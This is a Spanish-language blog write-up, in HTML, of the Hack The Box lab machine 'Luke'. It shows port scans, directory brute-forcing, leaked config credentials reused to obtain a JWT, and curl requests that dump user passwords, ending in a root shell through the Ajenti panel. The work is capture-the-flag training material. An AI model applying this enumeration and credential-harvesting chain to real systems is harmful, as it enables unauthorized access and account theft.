<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Luke :: sckull — TryHackMe, HackTheBox, CTF Writeups</title>    
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Nombre Luke     OS FreeBSD   Puntos 30   Dificultad Media   IP 10.10.10.137   Maker H4d3s    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y su servicio.
masscan -p1-65535,U:1-65535 10.10.10.137 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-28 21:04:45 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 8000/tcp on 10."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/luke/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Luke :: sckull — TryHackMe, HackTheBox, CTF Writeups" />
<meta name="twitter:description" content="Nombre Luke     OS FreeBSD   Puntos 30   Dificultad Media   IP 10.10.10.137   Maker H4d3s    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y su servicio.
masscan -p1-65535,U:1-65535 10.10.10.137 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-28 21:04:45 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 8000/tcp on 10." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/htb/luke/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Luke :: sckull — TryHackMe, HackTheBox, CTF Writeups">
<meta property="og:description" content="Nombre Luke     OS FreeBSD   Puntos 30   Dificultad Media   IP 10.10.10.137   Maker H4d3s    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y su servicio.
masscan -p1-65535,U:1-65535 10.10.10.137 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-28 21:04:45 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 8000/tcp on 10." />
<meta property="og:url" content="https://sckull.github.io/posts/luke/" />
<meta property="og:site_name" content="Hack The Box - Luke" />
<meta property="og:image" content="https://sckull.github.io/image/htb/luke/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Luke",
        "headline" : "Hack The Box - Luke",
        "description" : "Nombre Luke     OS FreeBSD   Puntos 30   Dificultad Media   IP 10.10.10.137   Maker H4d3s    MASSCAN &amp; NMAP Escaneo de puertos tcp/udp y su servicio.
masscan -p1-65535,U:1-65535 10.10.10.137 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-28 21:04:45 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 8000/tcp on 10.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2019",
        "datePublished": "2019-09-14 00:00:00 &#43;0000 UTC",
        "dateModified" : "2019-09-14 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/luke/",
        "wordCount" : "1041",
        "keywords" : [ "hackthebox","freebsd","Ajenti","nodejs","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2019-09-14 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - Luke</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Saturday, Sep 14, 2019
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 5 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/freebsd/"><li class="fa fa-tag"></li> freebsd</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/ajenti/"><li class="fa fa-tag"></li> Ajenti</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/nodejs/"><li class="fa fa-tag"></li> nodejs</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/luke/../../image/htb/luke/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#masscan-nmap">MASSCAN &amp; NMAP</a></li>
<li><a href="#ftp">FTP</a></li>
<li><a href="#http-puerto-80">HTTP - Puerto 80</a>
<ul>
<li><a href="#gobuster-puerto-80">GOBUSTER - Puerto 80</a>
<ul>
<li><a href="#config-php">/config.php</a></li>
<li><a href="#management">/management</a></li>
<li><a href="#login-php">/login.php</a></li>
</ul></li>
<li><a href="#puerto-8000">PUERTO 8000</a>
<ul>
<li><a href="#gobuster-puerto-3000">GOBUSTER - Puerto 3000</a></li>
<li><a href="#pagina-principal">Pagina principal</a></li>
<li><a href="#config-php-1">config.php</a></li>
<li><a href="#login-php-1">login.php</a></li>
</ul></li>
</ul></li>
<li><a href="#shell-user-root">SHELL - USER/ROOT</a></li>
<li><a href="#shell">SHELL</a></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Nombre</th>
<th>Luke</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>FreeBSD</td>
</tr>

<tr>
<td>Puntos</td>
<td>30</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Media</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.137</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/564">H4d3s</a></td>
</tr>
</tbody>
</table>

<hr />

<h2 id="masscan-nmap">MASSCAN &amp; NMAP</h2>

<p>Escaneo de puertos tcp/udp y su servicio.</p>

<pre><code class="language-bash">masscan -p1-65535,U:1-65535 10.10.10.137 --rate=1000 -e tun0
Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-28 21:04:45 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8000/tcp on 10.10.10.137                                  
Discovered open port 3000/tcp on 10.10.10.137
Discovered open port 80/tcp on 10.10.10.137                                    
Discovered open port 21/tcp on 10.10.10.137                                    
Discovered open port 22/tcp on 10.10.10.137

nmap -sV -p8000,3000,80,21,22 10.10.10.137 -o nmap.scan
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-28 16:28 CDT
Nmap scan report for 10.10.10.137
Host is up (1.2s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3+ (ext.1)
22/tcp   open  ssh?
80/tcp   open  http     Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
3000/tcp open  http     Node.js Express framework
8000/tcp open  http-alt
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.70%I=7%D=5/28%Time=5CEDA82A%P=x86_64-pc-linux-gnu%r(He
SF:lp,42,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nCo
SF:ntent-length:\x200\r\n\r\n&quot;)%r(SSLSessionReq,42,&quot;HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nConnection:\x20close\r\nContent-length:\x200\r\n\r\n&quot;)%
SF:r(LDAPSearchReq,42,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\nContent-length:\x200\r\n\r\n&quot;)%r(SIPOptions,42,&quot;HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-length:\x200\
SF:r\n\r\n&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.94 seconds
</code></pre>

<h2 id="ftp">FTP</h2>

<p>Ingresamos al servicio de FTP con las credenciales tipicas de anonymous y encontramos un archivo, <code>for_Chihiro.txt</code>.</p>

<p><img src="../../image/htb/luke/Screenshot_20190528_155131.png" alt="image" /></p>

<p><strong>for_Chihiro.txt</strong></p>

<pre><code class="language-bash">Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of                         
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !                               

Derry
</code></pre>

<p><img src="../../image/htb/luke/Screenshot_20190528_155304.png" alt="image" /></p>

<h2 id="http-puerto-80">HTTP - Puerto 80</h2>

<p><img src="../../image/htb/luke/Screenshot_20190528_163852.png" alt="image" /></p>

<h3 id="gobuster-puerto-80">GOBUSTER - Puerto 80</h3>

<pre><code class="language-bash">gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.137/ -np -t 15 -x php,html,txt                           
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.137/
[+] Threads      : 15
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,php,html
[+] Timeout      : 10s
=====================================================
2019/05/28 17:39:33 Starting gobuster
=====================================================
/cgi-bin/.html (Status: 403)
/config.php (Status: 200)
/css (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/LICENSE (Status: 200)
/login.php (Status: 200)
/management (Status: 301)
/member (Status: 301)
/vendor (Status: 301)
=====================================================
2019/05/28 17:46:34 Finished
=====================================================
</code></pre>

<h4 id="config-php">/config.php</h4>

<p><img src="../../image/htb/luke/Screenshot_20190528_164600.png" alt="image" /></p>

<pre><code class="language-php">$dbHost = 'localhost'; 
$dbUsername = 'root'; 
$dbPassword = 'Zk6heYCyv6ZE9Xcg'; 
$db = &quot;login&quot;; 
$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(&quot;Connect failed: %s\n&quot;. $conn -&gt; error); 
</code></pre>

<h4 id="management">/management</h4>

<p><img src="../../image/htb/luke/Screenshot_20190528_192916.png" alt="image" /></p>

<h4 id="login-php">/login.php</h4>

<p><img src="../../image/htb/luke/Screenshot_20190528_164636.png" alt="image" /></p>

<h3 id="puerto-8000">PUERTO 8000</h3>

<p>En el puerto 8000 encontramos un panel de logeo para la plataforma <code>Ajenti</code>.
<img src="../../image/htb/luke/Screenshot_20190528_193056.png" alt="image" /></p>

<p>En este punto utilizamos la contraseña y usuario que encontramos en config.php en los diferentes paneles de logeo pero no tuvimos acceso en ninguno de ellos con las credenciales.</p>

<h4 id="gobuster-puerto-3000">GOBUSTER - Puerto 3000</h4>

<p>Solo encontramos directorios para solicitudes de nodejs o json.</p>

<pre><code class="language-bash">gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.137:3000/ -np -t 15 -x php,html,txt,js
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.137:3000/
[+] Threads      : 15
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : html,txt,js,php
[+] Timeout      : 10s
=====================================================
2019/05/28 17:58:23 Starting gobuster
=====================================================
/login (Status: 200)
/Login (Status: 200)
/users (Status: 200)
=====================================================
2019/05/28 18:05:20 Finished
=====================================================
</code></pre>

<p>Realizamos un escaneo de directorios con DIRBUSTER y obtuvimos dos &ldquo;directorios&rdquo; más en <strong>/users</strong>.</p>

<pre><code class="language-bash">/users
/users/Admin
/users/admin
/users/ADMiN
</code></pre>

<p>Al visitar <strong>/login</strong> y <strong>/Login</strong> nos muestra el siguiente mensaje:
&ldquo;please auth&rdquo;</p>

<p>Al visitar /users:</p>

<pre><code class="language-json">{&quot;success&quot;:false,&quot;message&quot;:&quot;Auth token is not supplied&quot;}
</code></pre>

<p>Realizamos una busqueda de los mensajes que nos mostraba la pagina web al visitar cada uno de los &ldquo;directorios&rdquo;, encontramos una pagina que habal sobre tokens.</p>

<p><strong>INFO:</strong> <a href="https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04f4"><strong>Token Authentication - Nodejs</strong></a></p>

<p>Para obtener nuestro token utilizamos el siguiente request con curl, añadimos la contraseña que encontramos en la pagina config.php, usamos el usuario admin para el request.</p>

<pre><code class="language-bash">curl --header &quot;Content-Type: application/json&quot; --request POST --data '{&quot;password&quot;:&quot;Zk6heYCyv6ZE9Xcg&quot;, &quot;username&quot;:&quot;admin&quot;}'   http://10.10.10.137:3000/login
</code></pre>

<p>El resultado del request, obtuvimos nuestro token de autenticacion.</p>

<pre><code class="language-json">{&quot;success&quot;:true,&quot;message&quot;:&quot;Authentication successful!&quot;,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4&quot;}
</code></pre>

<p>Utilizamos el token de autenticacion para poder acceder a los usuarios dentro del &ldquo;directorio&rdquo; /users.</p>

<pre><code class="language-bash">curl -X GET \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4' \
  http://10.10.10.137:3000/users
</code></pre>

<p>El resultado del request, obtuvimos algunos nombres con su respectivo ID, Nombre y Rol que tiene cada uno de ellos.</p>

<pre><code class="language-json">[{&quot;ID&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Admin&quot;,&quot;Role&quot;:&quot;Superuser&quot;},{&quot;ID&quot;:&quot;2&quot;,&quot;name&quot;:&quot;Derry&quot;,&quot;Role&quot;:&quot;Web Admin&quot;},{&quot;ID&quot;:&quot;3&quot;,&quot;name&quot;:&quot;Yuri&quot;,&quot;Role&quot;:&quot;Beta Tester&quot;},{&quot;ID&quot;:&quot;4&quot;,&quot;name&quot;:&quot;Dory&quot;,&quot;Role&quot;:&quot;Supporter&quot;}]
</code></pre>

<p>Users:</p>

<pre><code class="language-json">[
   {
      &quot;ID&quot;:&quot;1&quot;,
      &quot;name&quot;:&quot;Admin&quot;,
      &quot;Role&quot;:&quot;Superuser&quot;
   },
   {
      &quot;ID&quot;:&quot;2&quot;,
      &quot;name&quot;:&quot;Derry&quot;,
      &quot;Role&quot;:&quot;Web Admin&quot;
   },
   {
      &quot;ID&quot;:&quot;3&quot;,
      &quot;name&quot;:&quot;Yuri&quot;,
      &quot;Role&quot;:&quot;Beta Tester&quot;
   },
   {
      &quot;ID&quot;:&quot;4&quot;,
      &quot;name&quot;:&quot;Dory&quot;,
      &quot;Role&quot;:&quot;Supporter&quot;
   }
]
</code></pre>

<p>Visitamos de igual forma la siguiente ruta con el token /users/Admin y obtuvimos la contraseña del usuario admin.</p>

<p>Request:</p>

<pre><code class="language-bash">curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4' http://10.10.10.137:3000/users/admin/
</code></pre>

<p>Respuesta:</p>

<pre><code class="language-json">{&quot;name&quot;:&quot;Admin&quot;,&quot;password&quot;:&quot;WX5b7)&gt;/rp$U)FW&quot;}
</code></pre>

<p>Utilizamos el mismo request cambiamos /admin/ por la lista de usuarios que encontramos para obtener las contraseñas de los mismos.</p>

<p>User-Pass:</p>

<pre><code class="language-json">{&quot;name&quot;:&quot;Admin&quot;,&quot;password&quot;:&quot;WX5b7)&gt;/rp$U)FW&quot;}
{&quot;name&quot;:&quot;Derry&quot;,&quot;password&quot;:&quot;rZ86wwLvx7jUxtch&quot;}
{&quot;name&quot;:&quot;Yuri&quot;,&quot;password&quot;:&quot;bet@tester87&quot;}
{&quot;name&quot;:&quot;Dory&quot;,&quot;password&quot;:&quot;5y:!xa=ybfe)/QD&quot;}
</code></pre>

<p>Utilizamos las Credenciales en los distintos paneles que encontramos, en el caso de las credenciales de Derry funcionaron en el panel de <strong>/management</strong> en el puerto 80 y nos muestra:</p>

<h4 id="pagina-principal">Pagina principal</h4>

<p><img src="../../image/htb/luke/Screenshot_20190528_193405.png" alt="image" /></p>

<p><strong>config.json</strong></p>

<pre><code class="language-json">{
    &quot;users&quot;: {
        &quot;root&quot;: {
            &quot;configs&quot;: {
                &quot;ajenti.plugins.notepad.notepad.Notepad&quot;: &quot;{\&quot;bookmarks\&quot;: [], \&quot;root\&quot;: \&quot;/\&quot;}&quot;, 
                &quot;ajenti.plugins.terminal.main.Terminals&quot;: &quot;{\&quot;shell\&quot;: \&quot;sh -c $SHELL || sh\&quot;}&quot;, 
                &quot;ajenti.plugins.elements.ipmap.ElementsIPMapper&quot;: &quot;{\&quot;users\&quot;: {}}&quot;, 
                &quot;ajenti.plugins.munin.client.MuninClient&quot;: &quot;{\&quot;username\&quot;: \&quot;username\&quot;, \&quot;prefix\&quot;: \&quot;http://localhost:8080/munin\&quot;, \&quot;password\&quot;: \&quot;123\&quot;}&quot;, 
                &quot;ajenti.plugins.dashboard.dash.Dash&quot;: &quot;{\&quot;widgets\&quot;: [{\&quot;index\&quot;: 0, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;1\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.sensors.memory.MemoryWidget\&quot;}, {\&quot;index\&quot;: 1, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;1\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.sensors.memory.SwapWidget\&quot;}, {\&quot;index\&quot;: 2, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;1\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.dashboard.welcome.WelcomeWidget\&quot;}, {\&quot;index\&quot;: 0, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;0\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.sensors.uptime.UptimeWidget\&quot;}, {\&quot;index\&quot;: 1, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;0\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.power.power.PowerWidget\&quot;}, {\&quot;index\&quot;: 2, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;0\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.sensors.cpu.CPUWidget\&quot;}]}&quot;, 
                &quot;ajenti.plugins.elements.shaper.main.Shaper&quot;: &quot;{\&quot;rules\&quot;: []}&quot;, 
                &quot;ajenti.plugins.ajenti_org.main.AjentiOrgReporter&quot;: &quot;{\&quot;key\&quot;: null}&quot;, 
                &quot;ajenti.plugins.logs.main.Logs&quot;: &quot;{\&quot;root\&quot;: \&quot;/var/log\&quot;}&quot;, 
                &quot;ajenti.plugins.mysql.api.MySQLDB&quot;: &quot;{\&quot;password\&quot;: \&quot;\&quot;, \&quot;user\&quot;: \&quot;root\&quot;, \&quot;hostname\&quot;: \&quot;localhost\&quot;}&quot;, 
                &quot;ajenti.plugins.fm.fm.FileManager&quot;: &quot;{\&quot;root\&quot;: \&quot;/\&quot;}&quot;, 
                &quot;ajenti.plugins.tasks.manager.TaskManager&quot;: &quot;{\&quot;task_definitions\&quot;: []}&quot;, 
                &quot;ajenti.users.UserManager&quot;: &quot;{\&quot;sync-provider\&quot;: \&quot;\&quot;}&quot;, 
                &quot;ajenti.usersync.adsync.ActiveDirectorySyncProvider&quot;: &quot;{\&quot;domain\&quot;: \&quot;DOMAIN\&quot;, \&quot;password\&quot;: \&quot;\&quot;, \&quot;user\&quot;: \&quot;Administrator\&quot;, \&quot;base\&quot;: \&quot;cn=Users,dc=DOMAIN\&quot;, \&quot;address\&quot;: \&quot;localhost\&quot;}&quot;, 
                &quot;ajenti.plugins.elements.usermgr.ElementsUserManager&quot;: &quot;{\&quot;groups\&quot;: []}&quot;, 
                &quot;ajenti.plugins.elements.projects.main.ElementsProjectManager&quot;: &quot;{\&quot;projects\&quot;: \&quot;KGxwMQou\\n\&quot;}&quot;
            }, 
            &quot;password&quot;: &quot;KpMasng6S5EtTy9Z&quot;, 
            &quot;permissions&quot;: []
        }
    }, 
    &quot;language&quot;: &quot;&quot;, 
    &quot;bind&quot;: {
        &quot;host&quot;: &quot;0.0.0.0&quot;, 
        &quot;port&quot;: 8000
    }, 
    &quot;enable_feedback&quot;: true, 
    &quot;ssl&quot;: {
        &quot;enable&quot;: false, 
        &quot;certificate_path&quot;: &quot;&quot;
    }, 
    &quot;authentication&quot;: true, 
    &quot;installation_id&quot;: 12354
}
</code></pre>

<h4 id="config-php-1">config.php</h4>

<pre><code class="language-php">$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = &quot;login&quot;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(&quot;Connect failed: %s\n&quot;. $conn -&gt; error); 
</code></pre>

<h4 id="login-php-1">login.php</h4>

<p><img src="../../image/htb/luke/Screenshot_20190528_193539.png" alt="image" /></p>

<p>Nos enfocamos en el archivo config.json el cual contiene configuracion del mismo usuario root, contraseña, y algunas otras configuraciones, una de las cuales nos muestra el host y puerto. Las credenciales:</p>

<pre><code class="language-text">user: root
password: KpMasng6S5EtTy9Z
</code></pre>

<p>Utilizamos las credenciales en el puerto 8000 y pudimos logearnos a la plataforma Ajenti.</p>

<p><img src="../../image/htb/luke/Screenshot_20190528_194922.png" alt="image" /></p>

<h2 id="shell-user-root">SHELL - USER/ROOT</h2>

<p>Utilizamos la opcion de TERMINAL que nos ofrece Ajenti y obtenemos una shell como usuario root, y las banderas <strong>user.txt/root.txt</strong>.</p>

<p><img src="../../image/htb/luke/Screenshot_20190528_195731.png" alt="image" /></p>

<h2 id="shell">SHELL</h2>

<p><img src="../../image/htb/luke/Screenshot_20190528_195414.png" alt="image" /></p>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/vulnos2/">
                <span class="button__icon">←</span>
                <span class="button__text">TryHackMe - Vulnos2</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/bastion/">
                <span class="button__text">Hack The Box - Bastion</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>


<script src="https://sckull.github.io/assets/zooming.js"></script>
<script>  
  new Zooming({
   bgColor: '#000',
   bgOpacity: 0.5,
   customSize: '100%'
 }).listen('img')
</script>


  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>



</body>
</html>
